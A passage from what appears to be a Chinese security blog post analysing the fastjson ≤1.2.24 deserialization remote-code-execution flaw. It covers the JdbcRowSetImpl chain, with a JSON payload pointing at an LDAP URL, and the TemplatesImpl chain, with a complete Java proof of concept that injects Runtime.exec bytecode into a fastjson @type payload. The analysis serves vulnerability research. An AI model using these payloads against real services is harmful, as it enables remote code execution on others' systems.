+<p><img src="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210304203745677.png?lastModify=1616638059" alt="img"></p>
+<p>向上追溯 <code>dataSource</code> 的附值，其来源于 <code>javax.sql.rowset.BaseRowSet#setDataSourceName</code>，也就是我们 POC 里的 <code>setDataSourceName</code></p>
+<p><img src="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210304203719889.png?lastModify=1616638059" alt="img"></p>
+<p>最后可以转换成 fastjson 的 POC</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/#Calc&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210303214247173.png?lastModify=1616638059" alt="img"></p>
+<p>留疑：<a target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/15555884828822">https://wx.zsxq.com/dweb2/index/topic_detail/15555884828822</a></p>
+<h1 id="TemplatesImpl-利用链"><a href="#TemplatesImpl-利用链" class="headerlink" title="TemplatesImpl 利用链"></a>TemplatesImpl 利用链</h1><h2 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h2><p>回顾我们 fastjson 在反序列化中调用 getter、setter、is 方法的特性，在无getter、setter方法的时候，NonPublicField 不会被反序列化，如果想要将其反序列化的话需要用到 SupportNonPublicField 这个 Feature，也就对应了上面的 1.2.22 版本改动，相应的实现如下</p>
+<ol>
+<li><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li>
+<li><code>JSON.parse(text1, Feature.SupportNonPublicField);</code></li>
+</ol>
+<p>JDK 限制为 1.7 全版本，1.8下部分版本也是可以成功的，这里我没展开测试</p>
+<p>对应 JDK7u21 的利用链也用到了 TemplatesImpl，但是 7u21 的修复点并不是这里，而是在之后的 AnnotationInvocationHandler，具体可以参看之前的文章，因此这个利用链应该是影响 JDK1.7的</p>
+<h2 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>反序列化利用链前面调用的都是 JDK7u21 利用链，这里直接将之前的 RCE demo 搬过来</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// javassist fake Code</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先看 <code>getOutputProperties</code>，是满足了 fastjson 调用 getter 的要求的，那么解决一下利用条件里面的 Feature.SupportNonPublicField 的来历</p>
+<p>根据其 TemplatesImpl 的源码可以发现这个变量为 private，因此需要利用到这个 Feature 去实现 NonPublicField 的反序列化</p>
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210304205659290.png"></p>
+<p>那么可以发现这里的变量名是带了 <code>_</code> 的，是否会调用 getOutputProperties ？</p>
+<p>跟进 fastjson 源码对其变量的处理，这里会去除掉 <code>_</code></p>
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210304210508557.png"></p>
+<p>javassist 里面生成的 payload 在 7u21 的链中主要限制条件如下，具体分析见前文</p>
+<ul>
+<li><code>_bytecodes</code> 类为 <code>AbstractTranslet</code> 的子类</li>
+<li><code>_name != null</code></li>
+<li><code>_class == null</code></li>
+<li><code>_tfactory</code>  的值的对象需要拥有 <code>getExternalExtensionsMap</code> 方法</li>
+</ul>
+<p>在 fastjson 中，由于 fastjson 源码中会对一些变量进行处理，因此 javassist 所构造的内容可能会有所不同</p>
+<p>先看对<code>_tfactory</code> 的处理，7u21 链中由于需要调用  <code>getExternalExtensionsMap</code> 方法，因此 <code>_tfactory</code>  对象需要经过特殊构造</p>
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305004613560.png"></p>
+<p>但是在 fastjson 中我们可以直接将其置为空，可以看一下相关的处理</p>
+<p>这里会进行一个判断，如果其为空的话就创建一个实例</p>
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305152951922.png"></p>
+<p>那么根据其  <code>_tfactory</code>  对象的定义，是有相应的方法的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> TransformerFactoryImpl _tfactory = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305153241962.png"></p>
+<p>再看一下对 <code>_bytecodes</code> 的处理</p>
+<p><code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code> 这里调用 bytesValue 方法</p>
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305153843235.png"></p>
+<p><code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 这里对应进行 base64 解码</p>
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305153939734.png"></p>
+<p>final POC</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImplDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        String b64_targetByteCodes = Base64.encodeBase64String(classBytes);</span><br><span class="line">        <span class="comment">// format</span></span><br><span class="line">        <span class="keyword">final</span> String type_class = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String myPOC = <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + type_class +<span class="string">&quot;\&quot;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+b64_targetByteCodes+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;TestDemo&#x27;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123;&#125;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(myPOC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305155946719.png"></p>
+<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7027">https://xz.aliyun.com/t/7027</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7107">https://xz.aliyun.com/t/7107</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1319/">https://paper.seebug.org/1319/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1274/">https://paper.seebug.org/1274/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1236/">https://paper.seebug.org/1236/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/">https://paper.seebug.org/1192/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#About-fastjson"><span class="toc-number">1.</span> <span class="toc-text">About fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-%E5%88%A9%E7%94%A8%E9%93%BE%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.</span> <span class="toc-text">fastjson 利用链影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">序列化与反序列化机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setter-%E8%B7%9F-getter-%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">setter 跟 getter 的限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-demo"><span class="toc-number">1.4.</span> <span class="toc-text">RCE demo</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JdbcRowSetImpl-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">JdbcRowSetImpl 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">利用链分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">TemplatesImpl 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">3.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">利用链分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REF"><span class="toc-number">4.</span> <span class="toc-text">REF</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析&body=Check out this article: http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析&description=&lt;p&gt;本篇主要分析 fastjson 漏洞成因，以及相关利用链&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 M13n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
